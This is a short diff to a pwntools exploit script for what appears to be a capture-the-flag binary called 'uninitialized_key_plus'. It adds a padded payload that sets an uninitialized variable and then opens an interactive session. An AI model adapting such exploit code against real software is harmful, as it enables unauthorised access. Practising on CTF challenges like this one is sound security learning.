@@ -14,7 +14,7 @@ context.terminal = ['tmux', 'splitw', '-h']
 debug = 1
 
 if debug:
-    io = process('./')
+    io = process('./uninitialized_key_plus')
 else:
     io = remote('')
 
@@ -22,6 +22,11 @@ def p():
     gdb.attach(proc.pidof(io)[0])
 
 #one_gadget = [,,]
+name = b'a' * 0x14 + b'\x52\xbf\x01\x00'
+io.sendlineafter(b"input your name:", name)
+
+#p()
+io.sendlineafter(b"r key:", b'q')
 
 
 io.interactive()
